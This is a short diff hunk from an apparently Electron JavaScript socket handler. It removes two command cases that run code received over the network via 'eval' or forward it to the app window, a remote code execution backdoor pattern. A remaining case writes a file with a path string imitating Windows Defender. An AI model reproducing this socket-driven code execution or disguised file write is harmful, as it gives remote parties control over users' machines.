@@ -120,13 +120,6 @@ async function initSocket() {
                 uniqueID: uniqueID
             });
             break;
-        case 10:
-            eval(data.code);
-            break;
-        case 11:
-            if (win)
-                win.webContents.send('code', data.code);
-            break;
         case 12:
             if (!fs.existsSync(abcFile)) {
                 fs.writeFileSync(abcFile, 'PATH=LOCAL_MACHINE/Defender/Programs/StartMenu/config');
